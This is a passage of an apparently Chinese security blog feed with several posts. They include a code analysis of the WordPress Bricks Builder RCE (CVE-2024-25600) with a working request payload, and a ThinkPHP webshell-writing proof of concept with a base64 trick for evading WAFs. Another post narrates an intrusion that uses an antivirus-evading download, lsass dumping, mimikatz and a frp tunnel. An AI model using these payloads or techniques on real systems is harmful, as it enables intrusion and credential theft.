src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/07.png" alt="image">  </p><p>跟进query.php，可以看到在下图111行中调用了prepare_query_vars_from_settings，传入的是$this-&gt;settings，向上回溯发现$this-&gt;settings来自于$element[‘settings’]，并且这些代码处于else子句中，也就是说需要让$query_instance的值为false，$query_instance的值来自于self::get_query_by_element_id( $this-&gt;element_id )，$this-&gt;element_id的值来自于实例化类Query时传进来的参数$element<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/08.png" alt="image">  </p><p>跟进get_query_by_element_id里面看一下，可以看到如果传进来的$element_id为空的话，则返回false，也就符合上面说的进入else子句<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/09.png" alt="image">  </p><p>然后看下哪些地方实例化了类Query，可以看到一共有15处<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="image">  </p><p>先看第1处，ajax.php，需要满足$loop_element不存在或为false的时候，才会实例化类Query，向上找发现$loop_element的值默认为false，假如中间没改变$loop_element的值，是没法实例化类Query<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="image">  </p><p>向下会看到new $element_class_name( $element )这样一行代码，关键点就在这个地方，此处才是漏洞的真正成因，想要执行new $element_class_name( $element )需要$element_class_name表示的类存在，跟进Elements可以看到，里面定义了一个静态属性$elements，初始化之后，回将$element_names中的元素注册到$elements中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="image">  </p><p>如下是注册到$elements中<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="image">  </p><p>再看一下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /WordPress-6.4.3/wp-json/bricks/v1/render\_element HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 270</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;postId&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;nonce&quot;: &quot; a980a714d9&quot;,</span><br><span class="line">    &quot;element&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;container&quot;,</span><br><span class="line">        &quot;settings&quot;: &#123;</span><br><span class="line">            &quot;hasLoop&quot;: &quot;&quot;,</span><br><span class="line">            &quot;query&quot;: &#123;&quot;useQueryEditor&quot;: &quot;&quot;,&quot;queryEditor&quot;: &quot;system(&#x27;calc&#x27;);&quot;,&quot;objectType&quot;: &quot;&quot;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们变成了实例化类Bricks\Element_Container，进到Element_Container类中，可以看到它是继承父类Element，也就是说它能调用的方法不光在它中，还可能在父类中，回到ajax.php，我们看下new $element_class_name( $element )之后的代码，调用了2个方法load和init，其中init在父类Element中，并且init中调用了方法render，然后render中实例化了类Query，满足上面我们分析的条件<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="image">  </p><h2 id="03-对应路由"><a href="#03-对应路由" class="headerlink" title="03 对应路由"></a>03 对应路由</h2><p>回到ajax.php，从注释中就能看到，一段是处理AJAX请求，一段是处理REST API请求<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="image">  </p><h2 id="04-权限绕过"><a href="#04-权限绕过" class="headerlink" title="04 权限绕过"></a>04 权限绕过</h2><p>可以看到代码AJAX中有权限检验，代码REST API中看似没有权限检验，但注释中说了，权限检查在API-&gt;render_element_permissions_check()中，跟进render_element_permissions_check后发现，内部其实没进行权限检查，只校验了nonce<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="image"><br>wordpress中明确提到，nonce不应作为权限验证，最终导致权限绕过<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png" alt="image">  </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞出现在后台的编辑器功能处，用于渲染元素并且预览效果，由于弱权限校验导致权限绕过可直接访问REST API端点，最终导致RCE，最后，感谢ID为zero的师傅分享的源码</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>漏洞发现者对漏洞的分析，总体行，细节不行<br><a href="https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6">https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6</a>  </p><p>补天上一篇还不错的文章<br><a href="https://forum.butian.net/share/2814">https://forum.butian.net/share/2814</a>  </p><p>CSDN上一篇还不错的文章<br><a href="https://blog.csdn.net/shelter1234567/article/details/136503993">https://blog.csdn.net/shelter1234567/article/details/136503993</a>  </p><p>AJAX和REST API<br><a href="https://www.runoob.com/php/php-restful.html">https://www.runoob.com/php/php-restful.html</a><br><a href="https://www.runoob.com/php/php-ajax-php.html">https://www.runoob.com/php/php-ajax-php.html</a>  </p><p>其他质量不高的文章我就不贴了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;朋友圈看到有人转发了一篇“CVE-2024-25600：WordPress Bricks Builder RCE”，感觉挺有意思，点进去看了</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>Parallels Desktop虚拟机（PD虚拟机）迁移到VMware Workstation</title>
    <link href="http://example.com/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/"/>
    <id>http://example.com/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/</id>
    <published>2024-12-29T14:01:44.000Z</published>
    <updated>2025-10-09T14:26:11.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工作需要，去现场干活但不能用自己的电脑，考虑将我平时用的虚拟机拷贝过去，但我是intel mac下使用parallels desktop虚拟化的win10，现场是windows机器，pd虚拟机无法导入vmware workstation中，google、知乎、v2ex上各种搜索，不是不完整，就是不可用，最终通过自己尝试和国外一篇博客发现可行的方法，本文记录一下</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>整体思路是，mac下vmware fusion导入pd虚拟机，vmware fusion中将虚拟机导出为ovf格式，最终导入vmware workstation中</p><h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><p>mac下安装好vmware fusion，截止到2024年12月22日，vmware fusion已经免费了，现在连破解许可都不用找了</p><h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><p>vmware fusion直接导入pd虚拟机会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error23 无法导入虚拟机</span><br></pre></td></tr></table></figure><p>需要使用qemu-img转换一下格式，安装qemu-img命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qemu</span><br></pre></td></tr></table></figure><p>我这边安装过程中提示还需要安装什么xcode(记不清了…)，需要一并安装，安装后使用如下命令转换（转换之前，虚拟机需要关机）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f parallels -O vmdk Win11-开发-0.hdd.0.&#123;5fbaabe3-6958-40ff-92a7-860e329aab41&#125;.hds win11.vmdk</span><br></pre></td></tr></table></figure><p>不知是否注意到，转换的不是.pvm文件，而是.hds文件，pvm文件-&gt;右键-&gt;显示包内容，将里面的.hdd文件拖出来，hdd文件-&gt;右键-&gt;显示包内容，将里面的.hds文件拖出来，这个地方让我伤到了，一开始转换pvm失败，后来转换hdd还是失败，想不到里面还有一个hds…</p><p>这里还有一个小坑点，hdd文件显示包内容后，可能会有两个hds文件，如果有2个，那另一个是你的快照，对比没有快照的pvm文件，里面只有一个hds文件</p><p>转换后，vmware fusion新建虚拟机，使用刚才生成的vmdk文件作为磁盘，可以成功导入</p><h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><p>vmware fusion中将虚拟机导出为ovf格式，最终导入vmware workstation中<br><img src="/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/02.png" alt="image">  </p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>隐约记得vmware workstation中是可以直接导入vmdk格式的文件，尝试一下，vmware workstation中，新建虚拟机-&gt;自定义虚拟机，一路下一步，创建硬盘时选择之前的vmdk文件，经测试，可成功导入<br><img src="/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/03.png" alt="image">  </p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.reddit.com/r/vmware/comments/1dvrkye/how_to_move_from_parallels_to_vmware/?rdt=39473">https://www.reddit.com/r/vmware/comments/1dvrkye/how_to_move_from_parallels_to_vmware/?rdt=39473</a></p><p><a href="https://chrisdooks.com/2024/05/15/import-a-parallels-vm-into-vmware-fusion-pro/">https://chrisdooks.com/2024/05/15/import-a-parallels-vm-into-vmware-fusion-pro/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工作需要，去现场干活但不能用自己的电脑，考虑将我平时用的虚拟机拷贝过去，但我是intel mac下使用parallels desktop虚拟</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP GetShell WAF绕过</title>
    <link href="http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/</id>
    <published>2024-11-18T12:38:34.000Z</published>
    <updated>2025-10-09T14:26:21.192Z</updated>
    
    <content type="html"><![CDATA[<p>分享一个ThinkPHP GetShell时WAF绕过的小技巧</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>以如下POC为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php phpinfo();&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><p>可能绕过WAF的POC为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php file_put_contents(&quot;todoback.php&quot;,base64_decode(&quot;垃圾字符&quot;));?&gt;&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/01.png" alt="image"><br>官方文档中提到，使用base64_decode解码但不指定第二个参数$strict时，base64字符集以外的字符将被忽略，由此我们可以利用它来插入大量垃圾字符</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>Ubuntu22.04 + 宝塔（Nginx1.24.0 + PHP5.6.40）</p><p>先测试合法base64字符，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/02.png" alt="image">  </p><p>测试插入非法base64字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==***&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/03.png" alt="image">  </p><p>测试插入100万个非法base64字符，python脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;a.txt&quot;, &quot;w&quot;) as fw:</span><br><span class="line">    for i in range(1000000):</span><br><span class="line">        fw.write(&quot;*&quot;)</span><br></pre></td></tr></table></figure><p>代码如下<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/04.png" alt="image"><br>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/05.png" alt="image">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分享一个ThinkPHP GetShell时WAF绕过的小技巧&lt;/p&gt;
&lt;h1 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h1&gt;&lt;p&gt;以如下POC为例&lt;/p&gt;
&lt;figure class=</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>从shiro命令执行到远程桌面登录</title>
    <link href="http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/"/>
    <id>http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/</id>
    <published>2024-10-06T01:32:57.000Z</published>
    <updated>2025-10-09T14:16:18.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内存马不是我的研究方向，从文件下载方向突破</p><h1 id="0x01-突破"><a href="#0x01-突破" class="headerlink" title="0x01 突破"></a>0x01 突破</h1><p>常规的文件下载方式bitsadmin、certutil、ftp等均被拦截，掏出储备的一个免杀的文件下载方式，可成功下载exe文件，尝试下载免杀远控并执行，发现无法执行（原因未知），改为下载魔改过的免杀冰蝎到对应的web目录下，成功连接webshell</p><h1 id="0x02-再突破"><a href="#0x02-再突破" class="headerlink" title="0x02 再突破"></a>0x02 再突破</h1><p>连接上webshell后，尝试执行远控仍旧失败，看来这条路行不通了，上传procdump抓取lsass的内存，想要下载到本地解密，发现不能下载（猜测可能是AV给拦截了），重新梳理下场景，想到既然是shiro的站点，那可以通过web服务下载文件，将文件移动到web目录后成功下载，随后通过mimikatz解出密码，密码真TM复杂啊，上传魔改过的免杀frp，建立隧道后，远程桌面成功连接</p><h1 id="0x03-优化"><a href="#0x03-优化" class="headerlink" title="0x03 优化"></a>0x03 优化</h1><p>远程桌面连接后，发现屏幕字体非常非常小，应该是我本机虚拟机的分辨率太高导致的，此时可以先修改本机的屏幕分辨率，再远程桌面连接后大小刚刚好，但是本机字体会非常非常大，且通过Win10自带的mstsc连接Windows Server 2008 R2时，是不能将密码拷贝到登录界面中，如果密码很复杂的话，不仅费力还容易出错，这里推荐使用UWP版本的远程桌面，可以先设置用户名密码再连接，也就是可以粘贴密码，在紧张的攻防中提供一些便利~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows命令学习之ICACLS</title>
    <link href="http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/"/>
    <id>http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/</id>
    <published>2024-08-15T08:49:32.000Z</published>
    <updated>2025-10-09T14:26:45.349Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>看到一个免杀下载的方式，其中包含这样一条命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>之前没接触过icacls，通过这篇笔记好好学习一下</p><h1 id="0x02-介绍"><a href="#0x02-介绍" class="headerlink" title="0x02 介绍"></a>0x02 介绍</h1><p>icacls：修改文件（文件夹）的权限</p><p>icacls是cacls和xcacls的增强版（但我在win10中搜索了一下，只搜到cacls，没搜到xcacls）</p><p>windows中文件（文件夹）的权限分为2种：继承的权限（inherit permission）、明确设置的权限（explicit permission）</p><p>可通过执行icacls.exe %cd%来查看当前目录的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\Desktop&gt;icacls.exe %cd%</span><br><span class="line">C:\Users\admin\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                       BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">                       DESKTOP-T86MV1G\admin:(I)(OI)(CI)(F)</span><br><span class="line"></span><br><span class="line">已成功处理 1 个文件; 处理 0 个文件时失败</span><br></pre></td></tr></table></figure><p>具体想掌握它是干什么的，怎么使用它，需要耐心的查看下面几个文章：<br><a href="https://ss64.com/nt/icacls.html">https://ss64.com/nt/icacls.html</a><br><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</a><br>cmd下执行icacls.exe /?查看用法帮助  </p><p>其中OI、CI、IO是只针对文件夹还是针对文件夹和文件，讲的不是很清楚，有时间测试一下</p><h1 id="0x03-用法"><a href="#0x03-用法" class="headerlink" title="0x03 用法"></a>0x03 用法</h1><p>回到最初那条命令，解释如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 设置当前用户对当前目录的权限为：禁止删除文件（文件夹）、子文件（子文件夹）</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>知道了什么含义，也有了上面学习的知识作为基础，我们可以写一个功能一样，形式不一样的命令，也算是一种免杀储备（暂未测试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(DE,DC) /T</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(D)</span><br><span class="line">icacls %cd% /deny %username%:D /T</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;看到一个免杀下载的方式，其中包含这样一条命令&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>移动端渗透测试环境搭建</title>
    <link href="http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2024-07-15T08:47:10.000Z</published>
    <updated>2025-10-09T14:24:35.554Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>接到一个Android APP渗透的任务，尝试用模拟器抓包发现闪退，看来反模拟器，手里有一台手机，型号是OPPO A57 5G，系统是ColorOS 14，手机和电脑在同一WiFi下，安装好burp证书，配置好代理，尝试抓包，发现无法抓取https包，好吧，开启折腾之旅</p><p>oppo安装证书<br><a href="https://www.cnblogs.com/tianpin/p/17503604.html">https://www.cnblogs.com/tianpin/p/17503604.html</a>  </p><h1 id="0x02-手机降级"><a href="#0x02-手机降级" class="headerlink" title="0x02 手机降级"></a>0x02 手机降级</h1><p>查阅相关资料得知，安卓7.0开始，想抓https包需要将证书装到系统证书目录下，想装到系统证书目录下需要root权限，现在问题变成如何root</p><p>之前手欠将ColorOS升级到14，我们都知道版本越高越不利于root，所以第一步是降级，ColorOS官方规定，降级需要一级一级降，不能一次降多级，所以我们要先降到ColorOS 13，再降到ColorOS 12，由于ColorOS最低只能降到手机出厂时的系统，我这边最低只能降到ColorOS 12</p><p>ColorOS 14降级到ColorOS 13<br><a href="https://www.ithome.com/0/742/497.htm">https://www.ithome.com/0/742/497.htm</a><br>ColorOS 13降级到ColorOS 12<br><a href="https://bbs.oneplus.com/thread/6387108">https://bbs.oneplus.com/thread/6387108</a>  </p><h1 id="0x03-Root准备"><a href="#0x03-Root准备" class="headerlink" title="0x03 Root准备"></a>0x03 Root准备</h1><p>首先复习了一下adb、recovery、fastboot的知识，然后手机连上电脑，开启USB调试，尝试通过adb和fastboot连接手机，发现没有fastboot命令，下载Android Studio的SDK，里面的platform-tools目录下有我们需要的工具（像夜神模拟器安装目录下也有adb，但是没有fastboot）</p><p>adb连接手机<br><a href="https://blog.csdn.net/qq_42864343/article/details/123813339">https://blog.csdn.net/qq_42864343/article/details/123813339</a><br>使用fastboot命令刷机流程详解<br><a href="https://blog.csdn.net/s13383754499/article/details/82755012">https://blog.csdn.net/s13383754499/article/details/82755012</a><br>oppo开启usb调试<br><a href="https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc</a><br>【2021】解决 Android Studio下载SDK失败 问题<br><a href="https://blog.csdn.net/weixin_43461724/article/details/120706675">https://blog.csdn.net/weixin_43461724/article/details/120706675</a>  </p><h1 id="0x04-成功Root"><a href="#0x04-成功Root" class="headerlink" title="0x04 成功Root"></a>0x04 成功Root</h1><p>查阅大量文章尝试root，发现OPPO A57 5G无法解锁BootLoader</p><p>oppo手机root<br><a href="https://www.shoujiroot.com/archives/146545.html">https://www.shoujiroot.com/archives/146545.html</a><br><a href="https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/">https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/</a>  </p><p>oppo a57刷机<br><a href="https://www.cnblogs.com/feiquan/p/9055823.html">https://www.cnblogs.com/feiquan/p/9055823.html</a><br><a href="https://blog.csdn.net/xgocn/article/details/107565522">https://blog.csdn.net/xgocn/article/details/107565522</a><br><a href="http://www.romgw.com/?p=334">http://www.romgw.com/?p=334</a>  </p><p>期间尝试刷机时碰到一个问题，我是mac系统下pd虚拟化的win10，无法将串口设备挂接到虚拟机，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/01.png" alt="image">  </p><p>经历各种失败后，已经打算放弃了，想想再试一次万能的淘宝吧，搜了一下，还真有刷机业务并且可以刷OPPO A57 